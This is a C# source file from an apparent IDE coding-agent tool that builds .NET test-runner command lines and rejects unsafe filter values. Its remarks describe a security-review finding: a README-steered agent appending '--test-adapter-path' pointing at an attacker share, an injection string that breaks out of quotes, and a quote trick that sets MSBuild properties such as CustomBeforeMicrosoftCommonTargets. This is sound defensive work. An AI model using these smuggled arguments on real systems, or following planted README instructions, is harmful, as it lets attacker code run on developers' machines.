using System;
using System.Collections.Generic;
using System.Linq;

namespace CodeWicket.Core.Ide
{
    /// <summary>Which structured filter the agent asked for, if any.</summary>
    public enum StructuredFilterKind { None, Method, Class, Namespace }

    /// <summary>
    /// A parsed test filter: either <see cref="Raw"/> (the escape hatch — a bare filter EXPRESSION in the
    /// project's framework dialect, which we hand to that dialect's filter option as one argument), or a
    /// structured intent (<see cref="Kind"/> + <see cref="Value"/>) we translate per project to that
    /// framework's native flags. Mutually exclusive; empty = run everything.
    /// </summary>
    /// <remarks>
    /// Parsing the agent's JSON arguments into one of these stays in <c>VsToolCatalog</c> — Core takes no
    /// JSON dependency. Only the parsed result crosses.
    /// </remarks>
    public sealed class FilterSpec
    {
        public string? Raw;
        public StructuredFilterKind Kind = StructuredFilterKind.None;
        public string? Value;
        public bool IsEmpty => string.IsNullOrEmpty(Raw) && Kind == StructuredFilterKind.None;
        public bool IsStructured => Kind != StructuredFilterKind.None;
        public string Describe() => Raw != null ? $"raw:{Raw}" : IsStructured ? $"{Kind}:{Value}" : "(none)";
    }

    /// <summary>
    /// Turns a classified test project plus a filter into the command line that runs it, and explains a
    /// filter that matched nothing.
    /// </summary>
    /// <remarks>
    /// Here rather than in <c>VsToolCatalog</c> for the reason <see cref="TestProjects"/> is: the catalog is
    /// net472 + the VS SDK and no test project can reference it, so these strings — which are what actually
    /// reaches the shell — could not otherwise be asserted anywhere. The failure they guard is quiet: a
    /// filter flag that a runner does not recognise does not usually error, it runs something other than
    /// what was asked for, and the card looks ordinary either way.
    /// </remarks>
    public static class TestRunCommands
    {
        /// <summary>
        /// The framework-native filter option string for one project (goes after <c>--</c> for MTP, or as a
        /// <c>dotnet test</c> argument for classic), or null when there's no filter. A raw spec is the bare
        /// expression and takes the dialect's own option (VSTest → <c>--filter</c>, xUnit v3 →
        /// <c>--filter-query</c>). A structured spec is translated: xUnit v3 → <c>--filter-*</c>; VSTest
        /// → a <c>FullyQualifiedName</c> expression (method = exact <c>=</c>; class/namespace = a <c>~</c>
        /// contains-match anchored with a trailing dot — substring, so a longer sibling name can also match).
        /// </summary>
        /// <remarks>
        /// <b>Every value is ONE argument, and the option is ours (pre-release security review, September 2026).</b> The raw
        /// escape hatch used to be "a verbatim, framework-native filter option string" appended to the
        /// command line - so it WAS the command line, and an agent steered by a README could append
        /// <c>--test-adapter-path \\attacker\share</c> and have the runner load an adapter from there,
        /// through a tool the permission model classifies ReadOnly. The structured values were injectable
        /// too: <c>x" --test-adapter-path \\evil "</c> broke out of the hand-written quotes. Now the
        /// option name is chosen here per dialect and the value is spelled by
        /// <see cref="CommandLineArgument.Quote"/>, which the runner's parser reads back as exactly one
        /// element whatever it contains. What quoting cannot do - an element that IS an option name -
        /// is refused up front by <see cref="RefuseFilterValue"/>. Nothing legitimate is lost: VSTest's
        /// backslash escapes pass through untouched, which a blanket backslash ban would
        /// refuse.
        /// </remarks>
        public static string? BuildFilterFragment(FilterSpec spec, FilterDialect dialect)
        {
            if (spec.IsEmpty)
                return null;
            if (spec.Raw != null)
            {
                return dialect switch
                {
                    FilterDialect.VsTest => "--filter " + CommandLineArgument.Quote(spec.Raw),
                    FilterDialect.XunitV3 => "--filter-query " + CommandLineArgument.Quote(spec.Raw),
                    _ => null, // Unknown — pre-flighted away before we get here
                };
            }
            var v = spec.Value ?? string.Empty;
            if (dialect == FilterDialect.XunitV3)
            {
                return spec.Kind switch
                {
                    StructuredFilterKind.Method => "--filter-method " + CommandLineArgument.Quote(v),
                    StructuredFilterKind.Class => "--filter-class " + CommandLineArgument.Quote(v),
                    StructuredFilterKind.Namespace => "--filter-namespace " + CommandLineArgument.Quote(v),
                    _ => null,
                };
            }
            if (dialect == FilterDialect.VsTest)
            {
                var expr = BuildVsTestExpression(spec);
                return expr is null ? null : "--filter " + CommandLineArgument.Quote(expr);
            }
            return null; // Unknown — pre-flighted away before we get here
        }

        /// <summary>
        /// Why a filter value cannot be run for a project of <paramref name="dialect"/>, or null when it
        /// can. Called for every target project before anything is spawned; a refusal is the tool's
        /// error, naming the contract.
        /// </summary>
        /// <remarks>
        /// <para>Three refusals, all about what <see cref="CommandLineArgument.Quote"/> cannot do. A quoted
        /// element that is exactly <c>--test-adapter-path</c> is still that option once the parser strips
        /// the quotes, so a value that must be a VALUE may not begin with an option prefix: <c>-</c>
        /// always, and <c>/</c> too where the runner takes slash options (VSTest's
        /// <c>/TestCaseFilter:</c>, and <c>dotnet test</c> forwards <c>/p:</c>). An xUnit v3 filter QUERY
        /// begins with <c>/</c> by its own grammar (<c>/Namespace/Class/Method</c>), and the MTP host
        /// takes only <c>--</c> options, so that dialect keeps the slash. And a control character has no
        /// place in any test name or expression, while a NUL would end the command line early.</para>
        /// <para>
        /// <b>The quote is the third, and it is there because <see cref="CommandLineArgument.Quote"/>
        /// guarantees one argument to the process we spawn — not to the parser that process hands the
        /// value to next.</b> Found in Visual Studio while exercising this finding (2026-09-09), against the real runner:
        /// <c>dotnet test</c> maps <c>--filter</c> onto an MSBuild PROPERTY, so a quote inside the value
        /// terminates that property early and the remainder is read by MSBuild as another
        /// <c>name=value</c> of its own. Measured, live —
        /// <c>FullyQualifiedName~CommandLineArgumentTests"CwktProbeProperty=1"</c> ran the same 15 tests
        /// as the clean filter and set the property silently, while a payload whose injected half held a
        /// SPACE failed loudly as <c>MSB4177: Invalid property</c>. The argv layer held in both cases and
        /// the layer past it did not, and <b>the quiet one is the dangerous one</b>: MSBuild properties
        /// include <c>CustomBeforeMicrosoftCommonTargets</c>, an attacker-authored targets file that
        /// runs — the very payload the finding named.
        /// </para>
        /// <para>
        /// Refusing it costs nothing, which is why it can be a blanket rule where the backslash ban tried
        /// first could not be: a quote is in neither dialect's grammar (VSTest escapes with <c>\</c> —
        /// <c>\(</c>, <c>\&amp;</c> — and an xUnit query is <c>/Ns/Class/Method[Trait=Value]</c>), and a
        /// test whose display name genuinely contains one could not be filtered through <c>dotnet
        /// test</c> anyway, for this exact reason. <b>The general lesson:</b> a value crossing into a
        /// runner we do not own is not safe because we spelled it correctly for the process boundary —
        /// it is safe only as far as the LAST parser that reads it.
        /// </para>
        /// <para>The old raw shape - <c>--filter "…"</c>, <c>--filter-query …</c>, <c>/TestCaseFilter:…</c>
        /// - is refused by the option rule with the new contract spelled out, rather than stripped: an
        /// agent told what to send fixes it in one retry, and a silent strip would turn a mis-shaped
        /// filter into a run of something other than what was asked for.</para>
        /// </remarks>
        public static string? RefuseFilterValue(FilterSpec spec, FilterDialect dialect)
        {
            if (spec.IsEmpty)
                return null;
            var value = spec.Raw ?? spec.Value ?? string.Empty;
            var isRaw = spec.Raw != null;
            var what = isRaw ? "'filter'" : ArgumentName(spec.Kind);

            foreach (var c in value)
            {
                if (c < ' ' || c == '\u007f')
                    return what + " contains a control character; a filter expression cannot.";
            }

            var trimmed = value.TrimStart();
            var first = trimmed.Length > 0 ? trimmed[0] : '\0';
            var looksLikeAnOption = first == '-' || (first == '/' && (!isRaw || dialect != FilterDialect.XunitV3));

            // Ahead of the quote rule below, and that ORDER is the message: the old raw shape
            // (--filter "…") trips both, and the one worth saying is the contract, which names what to
            // send instead. A quote message there would be true and useless.
            if (looksLikeAnOption)
            {
                if (!isRaw)
                    return what + " must be a test name, which cannot begin with '" + first + "'.";

                return "'filter' is the bare filter EXPRESSION, not a command-line option: the option is chosen "
                    + "per project. " + (dialect == FilterDialect.XunitV3
                        ? "For xUnit v3 (Microsoft Testing Platform) pass a filter query, e.g. '/Ns/Class/Method' "
                          + "or '/Ns/*/*[Category=Fast]' (it goes to --filter-query)."
                        : "For VSTest (classic, MSTest, NUnit, old-style) pass the expression that would follow "
                          + "--filter, e.g. 'FullyQualifiedName~Ns.Class&TestCategory=Fast'.")
                    + " Or use filterMethod / filterClass / filterNamespace, which are translated per framework.";
            }

            // The second parser, not ours (see the remarks): dotnet test forwards the filter to MSBuild
            // as a property, and a quote lets the rest of the value be read there as a setting of its own.
            if (value.IndexOf('"') >= 0)
            {
                return what + " contains a double quote. Neither filter dialect uses one, and dotnet test "
                    + "passes the filter on to MSBuild as a property, where a quote lets the rest of the "
                    + "value be read as a separate setting. Pass the expression alone, e.g. "
                    + (dialect == FilterDialect.XunitV3
                        ? "'/Ns/Class/Method'."
                        : "'FullyQualifiedName~Ns.Class&TestCategory=Fast' (escape a literal '(' or '&' with a backslash).");
            }

            return null;
        }

        private static string ArgumentName(StructuredFilterKind kind) => kind switch
        {
            StructuredFilterKind.Method => "filterMethod",
            StructuredFilterKind.Class => "filterClass",
            StructuredFilterKind.Namespace => "filterNamespace",
            _ => "filter",
        };

        /// <summary>
        /// The bare VSTest <c>FullyQualifiedName</c> expression for a structured spec, or null. Method is
        /// an exact <c>=</c>; class and namespace are a <c>~</c> contains-match anchored with a trailing
        /// dot - substring, so a longer sibling name can also match.
        /// </summary>
        /// <remarks>
        /// <b>The expression is built once and spelled twice.</b> <c>dotnet test</c> takes it as
        /// <c>--filter "expr"</c> and <c>vstest.console.exe</c> as <c>/TestCaseFilter:"expr"</c>, and they
        /// are the same VSTest expression underneath - so the two runners share this method rather than
        /// each formatting their own. Two copies would be two things to keep in step, and the way that
        /// failure shows up is not a crash: a filter the runner does not understand runs something other
        /// than what was asked for, and the card looks ordinary either way.
        /// </remarks>
        internal static string? BuildVsTestExpression(FilterSpec spec)
        {
            var v = spec.Value;
            return spec.Kind switch
            {
                StructuredFilterKind.Method => $"FullyQualifiedName={v}",
                StructuredFilterKind.Class => $"FullyQualifiedName~{v}.",
                StructuredFilterKind.Namespace => $"FullyQualifiedName~{v}.",
                _ => null,
            };
        }

        /// <summary>
        /// Human note for a run whose filter matched zero tests: names the filter, and — when an xUnit v3
        /// project is in play — explains that structured filters there are EXACT (no sub-namespaces / nested
        /// types) and points at the <c>*</c> wildcard or the raw <c>filter</c> escape hatch to widen it.
        /// </summary>
        public static string ZeroMatchFilterHint(FilterSpec filter, IReadOnlyList<TestProject> testProjects)
        {
            if (!filter.IsStructured)
                return "The filter matched 0 tests — check the expression and that the test names are correct.";

            var argName = ArgumentName(filter.Kind);
            var head = $"{argName} '{filter.Value}' matched 0 tests. ";
            var anyXunitV3 = testProjects.Any(p => p.Dialect == FilterDialect.XunitV3);
            if (anyXunitV3 && filter.Kind != StructuredFilterKind.Method)
                return head + "On xUnit v3, filterNamespace/filterClass match EXACTLY — sub-namespaces and "
                    + $"nested types are NOT included. Append a '*' wildcard to widen it (e.g. '{filter.Value}*'; "
                    + "xUnit allows '*' only at the start or end of the value), or pass a raw 'filter' expression.";
            return head + "Check the name is fully-qualified and spelled exactly as the failing-test list shows it.";
        }

        /// <summary>
        /// The <c>dotnet</c> arguments for one test project. <paramref name="filterFragment"/> (when non-empty) is
        /// the resolved, framework-native filter option string from <see cref="BuildFilterFragment"/> — MTP options
        /// (<c>--filter-method</c> / <c>--filter "&lt;expr&gt;"</c>) are appended after the <c>--</c> separator; a
        /// classic vstest <c>--filter "&lt;expr&gt;"</c> is a plain <c>dotnet test</c> argument.
        /// </summary>
        public static string BuildTestCommand(
            TestProjectKind kind, string projectFile, string configuration, string resultsDir,
            string? filterFragment, string? runSettingsPath)
        {
            if (kind == TestProjectKind.LegacyVsTest)
            {
                // Not a fallthrough case, and not defensive noise. Both branches below emit `dotnet`, and
                // neither `dotnet test` nor `dotnet run` can run a non-SDK project - so a legacy project
                // reaching here would be handed a command line that cannot work. Throwing names the
                // mistake at the point it is made; letting it fall through to the classic branch produces
                // a plausible-looking command and a failure attributed to the project.
                throw new ArgumentException(
                    "a LegacyVsTest project is run by vstest.console.exe, not by dotnet - "
                    + "use " + nameof(BuildLegacyVsTestArguments) + ".", nameof(kind));
            }

            if (kind == TestProjectKind.Mtp)
            {
                // No --settings here: the MTP host doesn't take runsettings (see FindSolutionRunSettings).
                var mtpArgs = $"--report-trx --results-directory \"{resultsDir}\""
                    + (string.IsNullOrEmpty(filterFragment) ? "" : " " + filterFragment);
                return $"run --project \"{projectFile}\" --no-build -c \"{configuration}\" -- {mtpArgs}";
            }
            return $"test \"{projectFile}\" --no-build -c \"{configuration}\""
                + (string.IsNullOrEmpty(runSettingsPath) ? "" : $" --settings \"{runSettingsPath}\"")
                + $" --logger \"trx;LogFileName=results.trx\" --results-directory \"{resultsDir}\""
                + (string.IsNullOrEmpty(filterFragment) ? "" : " " + filterFragment);
        }

        /// <summary>
        /// The <c>vstest.console.exe</c> arguments for one old-style test project, run against its BUILT
        /// OUTPUT ASSEMBLY. <paramref name="testAssembly"/> must be the <c>.dll</c>; the caller resolves it
        /// and reports a project it cannot resolve rather than calling this.
        /// </summary>
        /// <remarks>
        /// <para>
        /// <b>The argument is the assembly, never the project file.</b> Given a <c>.csproj</c>,
        /// vstest.console does not fail: measured 2026-09-04 against VSTest 18.9.0 it prints "a total of 1
        /// test files matched", exits <b>0</b>, and writes a TRX whose counters are all zero with
        /// <c>outcome="Completed"</c>. Every downstream reader here is happy with that, so the run would
        /// surface as a green card for a project that ran nothing - the worst shape a test result can take.
        /// </para>
        /// <para>
        /// <b>Neither /Platform nor /Framework is ever passed.</b> vstest.console infers both from the
        /// assembly itself - the PE header and <c>TargetFrameworkAttribute</c> - and a value we supplied
        /// would override that inference with a guess. Getting it wrong is not an error either: it runs,
        /// against the wrong runtime or bitness, and reports normally. There is nothing we know here that
        /// the assembly does not state about itself, so supplying either can only ever be worse.
        /// </para>
        /// <para>
        /// A solution <c>.runsettings</c> IS passed (<c>/Settings:</c>), matching what the classic runner
        /// already does with <c>--settings</c> and what Test Explorer would do with the same file. Noted
        /// because it sits close to the rule above: a runsettings can carry <c>TargetPlatform</c> and
        /// <c>TargetFrameworkVersion</c>, so it can reach the same knobs. The difference is authorship -
        /// the user put that file at the solution root and VS would honour it, whereas a <c>/Platform</c>
        /// we synthesised is ours. Withholding it here would make the same file apply to some of a
        /// solution's projects and not others, which is the more surprising of the two behaviours.
        /// </para>
        /// </remarks>
        public static string BuildLegacyVsTestArguments(
            string testAssembly, string resultsDir, string? filterExpression, string? runSettingsPath)
        {
            // The filter is ONE argument however it is spelled (see BuildFilterFragment): the
            // option is glued to the quoted value, which the runner's parser reads as a single element.
            return $"\"{testAssembly}\" /logger:trx /ResultsDirectory:\"{resultsDir}\""
                + (string.IsNullOrEmpty(runSettingsPath) ? "" : $" /Settings:\"{runSettingsPath}\"")
                + (string.IsNullOrEmpty(filterExpression) ? "" : " /TestCaseFilter:" + CommandLineArgument.Quote(filterExpression!));
        }

        /// <summary>
        /// The <c>/TestCaseFilter:</c> expression for one legacy project, or null when there is no filter.
        /// A raw spec is the expression itself, exactly as it is for the other runners.
        /// </summary>
        public static string? BuildLegacyFilterExpression(FilterSpec spec)
        {
            if (spec.IsEmpty)
                return null;
            if (spec.Raw != null)
                return spec.Raw;
            return BuildVsTestExpression(spec);
        }
    }
}
